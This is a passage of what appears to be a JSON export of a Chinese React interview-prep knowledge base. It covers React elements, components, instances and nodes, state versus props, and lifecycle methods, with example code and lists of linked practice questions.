props: {\n          name: '老干部'\n        }\n      },\n      {\n        type: 'p',\n        props: {\n          children: 'Anything you like'\n        }\n      }，\n    ]\n  }\n}\n```\n\n对于这个结构，React 知道如何渲染type = 'div' 和 type = 'p' 的节点，但不知道如何渲染type='Welcome'的节点，当React 发现Welcome 是一个React 组件时（判断依据是Welcome首字母为大写），会根据Welcome组件返回的React 元素决定如何渲染Welcome节点。Welcome组件返回的React 元素为：\n\n```js\n{\n  type: 'h1',\n  props: {\n  \tchildren: 'Hello, 老干部'\n  }\n}\n```\n\n这个结构中只包含DOM节点，React是知道如何渲染的。如果这个结构中还包含其他组件节点，React 会重复上面的过程，继续解析对应组件返回的React 元素，直到返回的React 元素中只包含DOM节点为止。这样的递归过程，让React 获取到页面的完整DOM结构信息，渲染的工作自然就水到渠成了。\n\n另外，如果仔细思考的话，可以发现，**React 组件的复用，本质上是为了复用这个组件返回的React 元素，React 元素是React 应用的最基础组成单位**。\n\n#### 实例 (Instance）\n\n这里的实例特指React组件的实例。React 组件是一个函数或类，实际工作时，发挥作用的是React 组件的实例对象。只有组件实例化后，每一个组件实例才有了自己的props和state，才持有对它的DOM节点和子组件实例的引用。在传统的面向对象的开发方式中，实例化的工作是由开发者自己手动完成的，但在React中，组件的实例化工作是由React自动完成的，组件实例也是直接由React管理的。换句话说，开发者完全不必关心组件实例的创建、更新和销毁。\n\n#### 节点 (Node)\n\n在使用PropTypes校验组件属性时，有这样一种类型：\n\n```js\nMyComponent.propTypes = { \n  optionalNode: PropTypes.node,\n}\n```\n\nPropTypes.node又是什么类型呢？这表明optionalNode是一个React 节点。React 节点是指可以被React渲染的数据类型，包括数字、字符串、React 元素，或者是一个包含这些类型数据的数组。例如：\n\n```js\n// 数字类型的节点\nfunction MyComponent(props) {\n  return 1;\n}\n\n// 字符串类型的节点\nfunction MyComponent(props) {\n  return 'MyComponent';\n}\n\n// React元素类型的节点\nfunction MyComponent(props) {\n  return <div>React Element</div>;\n}\n\n// 数组类型的节点，数组的元素只能是其他合法的React节点\nfunction MyComponent(props) {\n  const element = <div>React Element</div>;\n  const arr = [1, 'MyComponent', element];\n  return arr;\n}\n\n// 错误，不是合法的React节点\nfunction MyComponent(props) {\n  const obj = { a : 1}\n  return obj;\n}\n```\n\n最后总结一下，React 元素和组件的概念最重要，也最容易混淆；React 组件实例的概念大家了解即可，几乎使用不到；React 节点有一定使用场景，但看过本文后应该也就不存在理解问题了。\n\n",
    "testPoint": "### **1. React 元素（Element）**\n**React 元素**是构建 React 应用的最小单位，它是 JavaScript 对象，代表了 UI 的一种描述，类似于虚拟 DOM。React 元素包含了组件的结构、样式和属性，但它不是 DOM 节点。\n\n- **基本概念**：React 元素是不可变的，一旦创建就不能修改它的子元素或属性。React 会使用这些元素描述来渲染 UI。\n  - **考察点**：候选人是否知道 React 元素与 DOM 元素的区别，理解 React 元素是如何构成的。\n  - **示例问题**：\n    - 什么是 React 元素？它和 DOM 元素有什么区别？\n    - 解释 React 元素的不可变性。如何使用 JSX 创建一个 React 元素？\n  \n- **创建方式**：React 元素可以通过 `React.createElement` 或 JSX 来创建。\n  - **考察点**：候选人应该理解 JSX 语法最终会转化为 `React.createElement` 调用，并且能够手动写出 `createElement` 的代码。\n  - **示例问题**：\n    - 请写出一个 JSX 元素和一个 `React.createElement` 元素等效的代码。\n  \n- **虚拟 DOM**：React 元素是虚拟 DOM 的一部分，React 会根据这些元素构建虚拟 DOM 树，从而对比实际 DOM 的变化并进行高效更新。\n  - **考察点**：候选人是否理解虚拟 DOM 是如何通过 React 元素描述 UI，并与真实 DOM 进行对比更新的。\n  - **示例问题**：\n    - React 的虚拟 DOM 是如何工作的？React 元素如何与虚拟 DOM 关联？\n\n---\n\n### **2. React 组件（Component）**\nReact 组件是 React 应用的核心单位，它是一个 JavaScript 类或函数，控制着视图的渲染。组件可以接受 `props`（外部数据）和 `state`（内部状态）来控制它的输出。\n\n- **基本概念**：组件是 UI 的抽象，通常会返回一个 React 元素，并将其渲染到页面中。组件有两种类型：**类组件**和**函数组件**。\n  - **考察点**：候选人是否理解组件的生命周期，`props` 和 `state`，以及它们如何影响组件的渲染。\n  - **示例问题**：\n    - 什么是 React 组件？组件是如何接受和使用 `props` 和 `state` 的？\n    - 函数组件与类组件的主要区别是什么？如何实现相同的功能？\n\n- **生命周期**：类组件有生命周期方法（如 `componentDidMount`、`shouldComponentUpdate` 等），而函数组件可以通过 Hooks（如 `useEffect`）来处理副作用。\n  - **考察点**：候选人是否知道组件的生命周期方法，以及如何使用 Hooks 处理副作用。\n  - **示例问题**：\n    - React 组件的生命周期方法有哪些？它们分别在什么时机执行？\n    - 如何在函数组件中模拟类组件的生命周期？\n\n- **高阶组件（HOC）**：高阶组件是一个函数，它接受一个组件并返回一个新的组件，通常用于增强或修改组件的行为。\n  - **考察点**：候选人是否了解高阶组件的概念，以及如何使用它来增强组件的功能。\n  - **示例问题**：\n    - 什么是高阶组件（HOC）？它是如何工作的？\n\n---\n\n### **3. React 实例（Instance）**\nReact 实例通常指的是一个组件的实例。对于类组件，实例是该组件类的一个对象，可以通过该对象访问组件的状态、方法等。\n\n- **基本概念**：组件实例代表了组件在 UI 中的一个实际存在，每次组件渲染时都会生成一个新的实例。\n  - **考察点**：候选人是否理解组件实例是如何产生的，类组件和函数组件的实例化方式是否有区别。\n  - **示例问题**：\n    - 在 React 中，如何获取一个类组件的实例？函数组件有实例吗？\n\n- **实例方法**：类组件的实例具有一些方法，比如 `setState`，`forceUpdate` 等，可以通过这些方法来更新组件的状态和强制刷新组件。\n  - **考察点**：候选人是否理解如何使用组件实例中的方法来更新组件。\n  - **示例问题**：\n    - 你如何在类组件中访问组件实例？`this.setState()` 和 `this.forceUpdate()` 的区别是什么？\n\n- **组件实例的生命周期**：实例在组件挂载、更新和卸载过程中会经历不同的生命周期阶段。\n  - **考察点**：候选人是否了解组件实例在整个生命周期中的行为，尤其是组件的挂载和卸载过程。\n  - **示例问题**：\n    - 当组件实例被销毁时，会发生什么？React 如何清理组件的资源？\n\n---\n\n### **4. React 节点（Node）**\nReact 节点是指 React 元素在页面上渲染后的实际 DOM 节点，React 会将虚拟 DOM 转换为真实 DOM。\n\n- **基本概念**：React 节点是虚拟 DOM 与实际 DOM 之间的桥梁，它是真实的 DOM 元素，代表了 React 元素渲染后的最终输出。\n  - **考察点**：候选人是否知道 React 节点与 React 元素的区别，以及节点是如何与虚拟 DOM 进行交互的。\n  - **示例问题**：\n    - React 元素和 React 节点有什么区别？\n    - 你如何访问 React 节点（DOM 节点）？\n\n- **渲染到 DOM**：React 通过 `ReactDOM.render` 将虚拟 DOM 渲染成真实的 DOM 节点，并将其插入到页面中。\n  - **考察点**：候选人是否理解 `ReactDOM.render` 的工作原理，以及它如何将虚拟 DOM 转换为实际的 DOM 元素。\n  - **示例问题**：\n    - `ReactDOM.render` 是如何工作的？它将虚拟 DOM 转换为实际 DOM 的过程是什么？\n\n- **节点与组件的关系**：组件通过返回 React 元素来定义它们的视图结构，而元素最终会被转换成 DOM 节点显示在页面上。\n  - **考察点**：候选人是否理解组件与节点之间的关系，并知道如何管理节点的更新。\n  - **示例问题**：\n    - 组件中的 React 元素如何转化为实际 DOM 节点？React 是如何管理节点的更新的？",
    "exerciseKeyList": "[\"02cde100-0c41-4036-b224-31895cd8c339\",\"8c396acb-2093-4216-8d4a-f8fec4e64f26\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:04:01.000Z",
    "updateAt": "2024-12-26T11:12:01.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "02cde100-0c41-4036-b224-31895cd8c339",
        "title": "怎么在代码中判断一个 React 组件是 class component 还是 function component？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-04-26T07:45:16.000Z",
        "updateAt": "2024-07-23T09:49:08.000Z"
      },
      {
        "exerciseKey": "8c396acb-2093-4216-8d4a-f8fec4e64f26",
        "title": "怎么判断一个对象是否是 React 元素？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-25T01:21:53.000Z",
        "updateAt": "2024-07-23T09:47:31.000Z"
      }
    ]
  },
  "172": {
    "id": 172,
    "tagId": 13,
    "title": "state 与 props",
    "explanation": "## state\n\n### 基本定义\n\nstate是组件内部的状态（数据），不能够直接修改，必须要通过setState来改变值的状态，从而达到更新组件内部数据的作用。\n\n## props\n\n### 基本定义\n\nprops是指组件间传递的一种方式，props自然也可以传递state。由于React的数据流是自上而下的，所以是从父组件向子组件进行传递；另外组件内部的this.props属性是只读的不可修改。\n\n## 代码示例\n\n```js\n// 父组件\nimport stateJj from './stateJj.js'; // 引入子组件\nclass stateJjFather extends React.Component {\n    constructor(props) {\n        super(props);\n        // 设置state的默认值 且只能在constructor中设置\n        this.state = {\n            mes: '给子组件的信息',\n            obj： {\n                \n            },\n            arr: []\n        }\n    }\n    fun(e) {\n        \n    }\n    render() {\n        const {mes, obj, arr} = this.state;\n        return (\n            <div>\n                // 不写箭头函数 this指向会发生错误 也可以使用bind的方式绑定this\n                <stateJj name={'给子组件的信息'} name1={mes}  fun={(e) => this.fun(e)}  obj={obj}  arr={arr} />  \n            </div>\n        );\n    }\n}\n// 子组件\nclass stateJj extends React.Component {\n    constructor(props) {\n        super(props);\n        this.props; // 这里面就有父组件传的值\n        // 设置 默认state\n        this.state = {\n            text: props.initialValue || 'placeholder'\n        };\n\n        // ES6 类中函数必须手动绑定\n        this.handleChange = this.handleChange.bind(this);\n    }\n\n    handleChange(event) {\n        this.setState({\n            text: event.target.value\n        });\n    }\n\n    render() {\n        return (\n            <div>\n                {mes}\n            </div>\n        );\n    }\n}\n// 设置props值的类型\nstateJj.propTypes = {\n    optionalArray: PropTypes.array,\n    optionalBool: PropTypes.bool,\n    optionalFunc: PropTypes.func,\n    optionalNumber: PropTypes.number,\n    optionalObject: PropTypes.object,\n    optionalString: PropTypes.string,\n    optionalSymbol: PropTypes.symbol,   // 目前可以声明的所有变量类型\n};\n// 设置默认的props值\nstateJj.defaultProps = {\n};\n```\n\n## props的特性\n\n1.  只读性\n\nprops经常被用作渲染组件和初始化状态，当一个组件被实例化之后，它的props是只读的，不可改变的。如果props在渲染过程中可以被改变，会导致这个组件显示的形态变得不可预测。只有通过父组件重新渲染的方式才可以把新的props传入组件中。\n\n2.  不变性\n\n只能通过外部组件主动传入新的props来重新渲染子组件，否则子组件的props以及展现形式不会改变。\n\n## 通过setState改变state的值\n\nstate不同于props的一点是，state是可以被改变的。不过，不可以直接通过this.state=的方式来修改，而需要通过this.setState()方法来修改state。\n\n注意： state 只能在constructor中设置默认值\n\n### setState基础用法\n\n通常我们通过ajax请求数据后，在走通请求后，通过setState方法改变state的值,React会更新组件的数据状态state，并且重新调用render方法，也就是会对组件进行重新渲染。\n\n```js\n    // 这是封装的fetch方法\n    APIHelper.shipInfo({\n        shipName: value\n    }).then(res => {\n        let datas = res.data;\n        this.setState({\n            dataList: datas,\n        })\n    }).catch(err => {\n        this.setState({\n            isLoading: false,ue\n        });\n    })\n```\n\n### setState使用的注意事项\n\n1.  当我们调用这个函数的时候，React.js 会更新组件的状态 state ，并且重新调用 render 方法，然后再把 render 方法所渲染的最新的内容显示到页面上\n2.  React.js 并不会马上修改 state。而是把这个对象放到一个更新队列里面，稍后才会从队列当中把新的状态提取出来合并到 state 当中，然后再触发组件更新，也就是说setState的更新是异步的\n\n### 即时更新state的方法：\n\n1.  使用setState的第二个参数\n\n```js\n    setState({\n       mes: '123' \n    }, function() {\n        console.log(this.state.mes); // 此时state中的mes为 123\n    });\n```\n\n2.  使用react监测不到的方法调用setState\n\n```js\n    setTimeOut(function() {\n        setState({\n            mes: 123\n        })\n    }, 500); // 里面的值会即时更新 因为react并能监测定时器、延时器里面的方法\n    \n    // 在调用事件的时候使用原生事件\n    componentDidMount() {\n      document.querySelector('#btn-raw').addEventListener('click', this.onClick);\n    }\n    onClick() {\n      this.setState({count: this.state.count + 1});\n      console.log('# this.state', this.state);  // 打印的为即时值\n    }\n    // ......\n    render() {\n      console.log('#enter render');\n      return (\n        <div>\n          <div>{this.state.count}\n            <button id=\"btn-raw\">Increment Raw</button>\n          </div>\n        </div>\n      )\n    }\n    \n```\n\n## 总结\n\n1.  props用于定义外部接口，state用于记录内部状态\n2.  props的赋值在于外部世界使用组件，state的赋值在于组件内部\n3.  组件不应该改变props的值，而state存在的目的就是让组件来修改的\n4.  state 只能在constructor中设置默认值\n5.  setState修改state的值是异步的",
    "testPoint": "### **1. `state` 和 `props` 的基本概念与区别**\n- **`state`**：用于存储组件内部的可变数据。`state` 是局部的，每个组件可以有自己的状态，且可以在组件内部被修改。\n- **`props`**：用于传递父组件到子组件的数据，是只读的，子组件不能修改 `props`。\n\n**考察点**：\n- **`state` 与 `props` 的区别**：什么时候使用 `state`，什么时候使用 `props`？\n- **如何通过 `state` 更新组件的渲染？**\n- **`props` 是只读的，为什么？如何改变传递给子组件的 `props`？**\n\n**示例问题**：\n- `state` 和 `props` 有什么区别？什么时候应该使用 `state`，什么时候应该使用 `props`？\n- 你如何在 React 中改变 `state`？\n\n**代码示例**：\n```javascript\n// state 示例\nclass MyComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  increment = () => {\n    this.setState({ count: this.state.count + 1 });\n  };\n\n  render() {\n    return (\n      <div>\n        <p>{this.state.count}</p>\n        <button onClick={this.increment}>Increment</button>\n      </div>\n    );\n  }\n}\n\n// props 示例\nfunction ChildComponent(props) {\n  return <h1>{props.message}</h1>;\n}\n\nfunction ParentComponent() {\n  return <ChildComponent message=\"Hello, World!\" />;\n}\n```\n\n---\n\n### **2. `state` 的更新**\nReact 的 **`setState`** 方法用于更新组件的 `state`，而 `setState` 是异步的，这意味着 React 会批量处理 `setState` 的调用。\n\n**考察点**：\n- **`setState` 是异步的**：候选人需要理解 `setState` 可能不会立刻更新 `state`，而是会被 React 合并并异步更新。\n- **`setState` 的回调函数**：`setState` 提供了一个回调函数，可以在状态更新并重新渲染后执行某些操作。\n- **`prevState` 和 `state` 的更新**：如何使用 `prevState` 来确保更新是基于最新的 `state`。\n\n**示例问题**：\n- `setState` 是同步还是异步的？为什么它是异步的？\n- 如何确保在更新 `state` 时使用最新的 `state` 值？\n\n**代码示例**：\n```javascript\nthis.setState((prevState) => ({\n  count: prevState.count + 1\n}), () => {\n  console.log('State updated');\n});\n```\n\n---\n\n### **3. `props` 的传递与更新**\n`props` 是从父组件传递到子组件的数据，子组件不能直接修改 `props`，但可以根据 `props` 来渲染 UI。\n\n**考察点**：\n- **`props` 是只读的**：如何确保子组件不能直接修改 `props`？\n- **如何通过 `props` 将数据传递给子组件？**\n- **`props` 和 `state` 的关系**：当 `props` 改变时，组件如何重新渲染？\n\n**示例问题**：\n- 如果你需要在子组件中修改 `props`，该如何做？\n- 组件在渲染时，`props` 和 `state` 会有何影响？\n\n**代码示例**：\n```javascript\nfunction ChildComponent(props) {\n  return <h1>{props.name}</h1>;\n}\n\nfunction ParentComponent() {\n  const [name, setName] = useState('John');\n  return <ChildComponent name={name} />;\n}\n```\n\n---\n\n### **4. `state` 和 `props` 的传递链**\n`props` 是单向数据流的，数据从父组件传递到子组件，而 `state` 是局部的，只在组件内部有效。候选人需要理解如何在复杂的组件树中管理和传递数据。\n\n**考察点**：\n- **单向数据流**：理解数据流动的方向以及如何通过 `props` 将父组件的状态传递到子组件。\n- **传递函数作为 `props`**：父组件可以将函数作为 `props` 传递给子组件，使得子组件可以调用父组件的函数来修改父组件的状态。\n\n**示例问题**：\n- 你如何从子组件更新父组件的状态？\n- 在 React 中，如何管理跨多个层级组件的数据流？\n\n**代码示例**：\n```javascript\nfunction ParentComponent() {\n  const [count, setCount] = useState(0);\n\n  const increment = () => setCount(count + 1);\n\n  return <ChildComponent increment={increment} />;\n}\n\nfunction ChildComponent({ increment }) {\n  return <button onClick={increment}>Increment</button>;\n}\n```\n\n---\n\n### **5. 受控组件与非受控组件**\n**受控组件**：组件的 `state` 由 React 控制，用户输入的值会同步到 `state`。\n**非受控组件**：组件的 `state` 由 DOM 控制，React 不干预。\n\n**考察点**：\n- **受控组件的概念**：组件的值通过 `state` 管理，输入框的值由 `state` 控制。\n- **非受控组件的概念**：使用 `ref` 来直接访问 DOM 元素的值。\n- **什么时候使用受控组件，什么时候使用非受控组件？**\n\n**示例问题**：\n- 什么是受控组件和非受控组件？请给出例子。\n- 受控组件和非受控组件的优缺点是什么？\n\n**代码示例**：\n```javascript\n// 受控组件\nfunction ControlledInput() {\n  const [value, setValue] = useState('');\n\n  return (\n    <input \n      type=\"text\" \n      value={value} \n      onChange={(e) => setValue(e.target.value)} \n    />\n  );\n}\n\n// 非受控组件\nfunction UncontrolledInput() {\n  const inputRef = useRef();\n\n  const handleSubmit = () => {\n    alert(inputRef.current.value);\n  };\n\n  return (\n    <div>\n      <input type=\"text\" ref={inputRef} />\n      <button onClick={handleSubmit}>Submit</button>\n    </div>\n  );\n}\n```\n\n---\n\n### **6. `state` 的合并与批量更新**\nReact 会在更新多个 `setState` 时进行 **批量更新**，即多个 `setState` 调用会合并为一次更新。\n\n**考察点**：\n- **`setState` 的合并**：多个调用 `setState` 后，React 会合并更新，而不是每次都重新渲染。\n- **`setState` 批量更新的性能优化**：理解如何利用批量更新提高性能。\n\n**示例问题**：\n- `setState` 是如何合并更新的？如何在多个 `setState` 调用时避免不必要的渲染？\n\n---\n\n### **7. `state` 的优化**\n`state` 的更新和重新渲染会影响性能，特别是在大型应用中。候选人需要了解如何优化 `state` 的管理和更新。\n\n**考察点**：\n- **React.memo 与 `shouldComponentUpdate`**：如何防止不必要的重新渲染。\n- **局部更新 `state`**：如何优化 `state` 的结构，避免更新整个对象导致不必要的渲染。\n\n**示例问题**：\n- 如何优化 React 中的 `state` 更新，避免不必要的重新渲染？\n\n---\n\n### **8. `props` 的变化**\n父组件的 `props` 发生变化时，子组件会重新渲染。候选人需要理解如何通过 `props` 传递数据以及 `props` 变化时如何影响渲染。\n\n**考察点**：\n- **父组件的 `props` 变化如何影响子组件**：理解 React 的渲染机制，父组件的 `props` 变化会触发子组件的重新渲染。\n- **`React.memo` 优化**：如何使用 `React.memo` 避免子组件因 `props` 的变化而重新渲染。\n\n**示例问题**：\n- 当父组件的 `props` 发生变化时，子组件如何重新渲染？",
    "exerciseKeyList": "[\"02cde100-0c41-4036-b224-31895cd8c339\",\"08ec624c-9c3d-4f11-ba4f-09e0986c9838\",\"f28ca2b5-ff42-4522-8cf3-b4e3e835b85d\",\"eef587e7-d29b-4b32-b672-7f8fe2e84217\",\"f31923c7-7157-408b-8e12-74ced305802e\",\"36be973b-0351-4a18-b6b8-5e68023e7b96\",\"e246ac60-73f0-4e33-b0f9-b0d1e6c15af8\",\"e203426f-23a1-4872-8ff7-1d0d27e57a81\"]",
    "vipLimit": 1,
    "level": 1,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:09:06.000Z",
    "updateAt": "2025-01-07T12:40:33.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "02cde100-0c41-4036-b224-31895cd8c339",
        "title": "怎么在代码中判断一个 React 组件是 class component 还是 function component？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-04-26T07:45:16.000Z",
        "updateAt": "2024-07-23T09:49:08.000Z"
      },
      {
        "exerciseKey": "08ec624c-9c3d-4f11-ba4f-09e0986c9838",
        "title": "React 组件间怎么进行通信？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:03:47.000Z",
        "updateAt": "2024-08-10T17:05:01.000Z"
      },
      {
        "exerciseKey": "36be973b-0351-4a18-b6b8-5e68023e7b96",
        "title": "setState 是同步，还是异步的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:08:16.000Z",
        "updateAt": "2024-08-10T17:05:02.000Z"
      },
      {
        "exerciseKey": "e203426f-23a1-4872-8ff7-1d0d27e57a81",
        "title": "在 shouldComponentUpdate 或 componentWillUpdate 中使用 setState 会发生什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:11:57.000Z",
        "updateAt": "2024-08-10T17:05:03.000Z"
      },
      {
        "exerciseKey": "e246ac60-73f0-4e33-b0f9-b0d1e6c15af8",
        "title": "为什么不能直接使用 this.state 改变数据？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:53:12.000Z",
        "updateAt": "2024-08-10T17:04:56.000Z"
      },
      {
        "exerciseKey": "eef587e7-d29b-4b32-b672-7f8fe2e84217",
        "title": "React中，能否直接将 props 的值复制给 state？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:45:40.000Z",
        "updateAt": "2024-08-10T17:04:59.000Z"
      },
      {
        "exerciseKey": "f28ca2b5-ff42-4522-8cf3-b4e3e835b85d",
        "title": "state 和 props有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T04:23:15.000Z",
        "updateAt": "2024-08-10T17:05:53.000Z"
      },
      {
        "exerciseKey": "f31923c7-7157-408b-8e12-74ced305802e",
        "title": "setState 之后发生了什么\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:11:31.000Z",
        "updateAt": "2024-08-10T17:05:02.000Z"
      }
    ]
  },
  "196": {
    "id": 196,
    "tagId": 13,
    "title": "React 生命周期",
    "explanation": "## 简介\n\nReact从v16.3的版本开始， 对生命周期的钩子进行了渐进式的调整，分别废弃和新增了一些生命周期的钩子函数，本文会从以下四点开始讲解：\n\n1.  新旧生命周期函数的对比\n2.  分析为什么要废弃旧的钩子函数\n3.  详解新的生命周期使用场景\n4.  实例代码演示并进行总结\n\n## 新旧生命周期对比\n\n一个完整的React组件生命周期会依次调用如下钩子：\n\n### old lifecycle\n\n![](https://static.ecool.fun//article/d9a8b8fd-8693-434a-93bd-6a34122a2cba.awebp)\n\n挂载\n\n+   constructor\n+   componentWillMount\n+   render\n+   componentDidMount\n\n更新\n\n+   componentWillReceiveProps\n+   shouldComponentUpdate\n+   componentWillUpdate\n+   render\n+   componentDidUpdate\n\n卸载\n\n+   componentWillUnmount\n\n### new lifecycle\n\n![](https://static.ecool.fun//article/dc093908-2560-4080-a955-a91e158f6f7f.awebp)\n\n+   挂载\n    +   constructor\n    +   getDerivedStateFromProps\n    +   render\n    +   componentDidMount\n+   更新\n    +   getDerivedStateFromProps\n    +   shouldComponentUpdate\n    +   render\n    +   getSnapshotBeforeUpdate\n    +   componentDidUpdate\n+   卸载\n    +   componentWillUnmount\n\n从以上生命周期的对比，我们不难看出，React从v16.3开始废弃 `componentWillMount` `componentWillReceiveProps` `componentWillUpdate` 三个钩子函数\n\n## 分析废弃原因\n\nFacebook花了两年多的时间搞出了React Fiber, 因为在v15的版本，更新过程是同步的，往往一个主线程长时间被占用，会导致页面性能问题\n\n而 **React Fiber的机制:** 利用浏览器 `requestIdleCallback` 将可中断的任务进行分片处理，每一个小片的运行时间很短，这样唯一的线程就不会被独占\n\n需要详细了解可以点下面链接 [Morgan大佬 - 知乎](https://zhuanlan.zhihu.com/p/26027085 \"https://zhuanlan.zhihu.com/p/26027085\")\n\n> 那么React Fiber会对生命周期带来什么影响吗？\n\n因为React Fiber `Reconciliation` 这个过程有可能暂停然后继续执行，所以挂载和更新之前的生命周期钩子就有可能不执行或者多次执行；\n\n目前React为这几个生命周期钩子提供了别名，分别是：\n\n+   UNSAFE\\_componentWillMount\n+   UNSAFE\\_componentWillReceiveProps\n+   UNSAFE\\_componentWillUpdate\n\nReact17将只提供别名，取个别名的目的就是恶心你，不让你使用。\n\n## 详解新的生命周期\n\n### 各个阶段生命周期函数\n\n#### constructor()\n\n`constructor()` 在React组件挂载之前被调用，在为React.Component子类实现构造函数时，应在其他语句之前调用 `super()`\n\n> super的作用：将父类的this对象继承给子类 ([MDN参考](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/super#%E6%8F%8F%E8%BF%B0 \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/super#%E6%8F%8F%E8%BF%B0\"))\n\n通常，React构造函数仅用于以下两种情况：\n\n+   来初始化函数内部 state\n+   为 [事件处理函数](https://zh-hans.reactjs.org/docs/handling-events.html \"https://zh-hans.reactjs.org/docs/handling-events.html\") 绑定实例\n\n> 如果不初始化 `state` 或不进行方法绑定，则不需要写 `constructor()` , 只需要设置 `this.state` 即可\n\n> 不能在 `constructor()`构造函数内部调用 `this.setState()`, 因为此时第一次 `render()`还未执行，也就意味DOM节点还未挂载\n\n#### static getDerivedStateFromProps(nextProps, state)\n\n`getDerivedStateFromProps()` 在调用 `render`方法之前调用，在初始化和后续更新都会被调用\n\n> 返回值：返回一个对象来更新 `state`, 如果返回 `null` 则不更新任何内容\n\n> 参数： 第一个参数为即将更新的 `props`, 第二个参数为上一个状态的 `state` , 可以比较`props` 和 `state`来加一些限制条件，防止无用的state更新\n\n> 注意：`getDerivedStateFromProps` 是一个静态函数，不能使用this, 也就是只能作一些无副作用的操作\n\n#### render()\n\n`render()` 方法是class组件中唯一必须实现的方法，用于渲染dom, `render()`方法必须返回reactDOM\n\n> 注意： 不要在 `render` 里面 `setState`, 否则会触发死循环导致内存崩溃\n\n#### componentDidMount()\n\n`componentDidMount()` 在组件挂载后 (插入DOM树后) 立即调用，`componentDidMount()` 是发送网络请求、启用事件监听方法的好时机，并且可以在 此钩子函数里直接调用 `setState()`\n\n#### shouldComponentUpdate(nextProps, nextState)\n\n`shouldComponentUpdate()` 在组件更新之前调用，可以控制组件是否进行更新， 返回true时组件更新， 返回false则不更新\n\n> 包含两个参数，第一个是即将更新的 props 值，第二个是即将跟新后的 state 值，可以根据更新前后的 props 或 state 来比较加一些限制条件，决定是否更新，进行性能优化\n\n> 不建议在 `shouldComponentUpdate()` 中进行深层比较或使用 `JSON.stringify()`。这样非常影响效率，且会损害性能\n\n> 不要 `shouldComponentUpdate` 中调用 setState()，否则会导致无限循环调用更新、渲染，直至浏览器内存崩溃\n\n> 可以使用内置 **[`PureComponent`](https://zh-hans.reactjs.org/docs/react-api.html#reactpurecomponent \"https://zh-hans.reactjs.org/docs/react-api.html#reactpurecomponent\")** 组件替代\n\n#### getSnapshotBeforeUpdate(prevProps, prevState)\n\n`getSnapshotBeforeUpdate()` 在最近一次的渲染输出被提交之前调用。也就是说，在 render 之后，即将对组件进行挂载时调用。\n\n> 它可以使组件在 DOM 真正更新之前捕获一些信息（例如滚动位置），此生命周期返回的任何值都会作为参数传递给 `componentDidUpdate()`。如不需要传递任何值，那么请返回 null\n\n#### componentDidUpdate(prevProps, prevState, snapshot)\n\n`componentDidUpdate()` 会在更新后会被立即调用。首次渲染不会执行\n\n> 包含三个参数，第一个是上一次props值。 第二个是上一次state值。如果组件实现了 `getSnapshotBeforeUpdate()` 生命周期（不常用），第三个是“snapshot” 参数传递\n\n> 可以进行前后props的比较进行条件语句的限制，来进行 `setState()` , 否则会导致死循环\n\n#### componentWillUnmount()\n\n`componentWillUnmount()` 在组件即将被卸载或销毁时进行调用。\n\n> 此生命周期是**取消网络请求**、移除**监听事件**、**清理 DOM 元素**、**清理定时器**等操作的好时机\n\n### 生命周期执行顺序\n\n#### 创建时\n\n+   constructor()\n+   static getDerivedStateFromProps()\n+   render()\n+   componentDidMount()\n\n#### 更新时\n\n+   static getDerivedStateFromProps()\n+   shouldComponentUpdate()\n+   render()\n+   getSnapshotBeforeUpdate()\n+   componentDidUpdate()\n\n#### 卸载时\n\n+   componentWillUnmount()\n\n## 实例展示\n\n下面代码的react版本是16.4.0, 会根据父子组件props改变，父组件卸载、重新挂载子组件，子组件改变自身状态state这几个操作步骤，对其生命周期的执行顺序进行讲解\n\n#### 组件代码展示\n\n##### 父组件：Parent.js\n\n```javascript\nimport React, { Component } from 'react';\nimport { Button } from 'antd';\nimport Child from './child';\n\nconst parentStyle = {\n  padding: 40,\n  margin: 20,\n  backgroundColor: 'LightCyan',\n};\n\nconst NAME = 'Parent 组件：';\n\nexport default class Parent extends Component {\n  constructor() {\n    super();\n    console.log(NAME, 'constructor');\n    this.state = {\n      count: 0,\n      mountChild: true,\n    };\n  }\n\n  static getDerivedStateFromProps(nextProps, prevState) {\n    console.log(NAME, 'getDerivedStateFromProps');\n    return null;\n  }\n\n  componentDidMount() {\n    console.log(NAME, 'componentDidMount');\n  }\n\n  shouldComponentUpdate(nextProps, nextState) {\n    console.log(NAME, 'shouldComponentUpdate');\n    return true;\n  }\n\n  getSnapshotBeforeUpdate(prevProps, prevState) {\n    console.log(NAME, 'getSnapshotBeforeUpdate');\n    return null;\n  }\n\n  componentDidUpdate(prevProps, prevState, snapshot) {\n    console.log(NAME, 'componentDidUpdate');\n  }\n\n  componentWillUnmount() {\n    console.log(NAME, 'componentWillUnmount');\n  }\n\n  /**\n   * 修改传给子组件属性 count 的方法\n   */\n  changeNum = () => {\n    let { count } = this.state;\n    this.setState({\n      count: ++count,\n    });\n  };\n\n  /**\n   * 切换子组件挂载和卸载的方法\n   */\n  toggleMountChild = () => {\n    const { mountChild } = this.state;\n    this.setState({\n      mountChild: !mountChild,\n    });\n  };\n\n  render() {\n    console.log(NAME, 'render');\n    const { count, mountChild } = this.state;\n    return (\n      <div style={parentStyle}>\n        <div>\n          <h3>父组件</h3>\n          <Button onClick={this.changeNum}>改变传给子组件的属性 count</Button>\n          <br />\n          <br />\n          <Button onClick={this.toggleMountChild}>卸载 / 挂载子组件</Button>\n        </div>\n        {mountChild ? <Child count={count} /> : null}\n      </div>\n    );\n  }\n}\n```\n\n##### 子组件： Child.js\n\n```javascript\nimport React, { Component } from 'react';\nimport { Button } from 'antd';\n\nconst childStyle = {\n 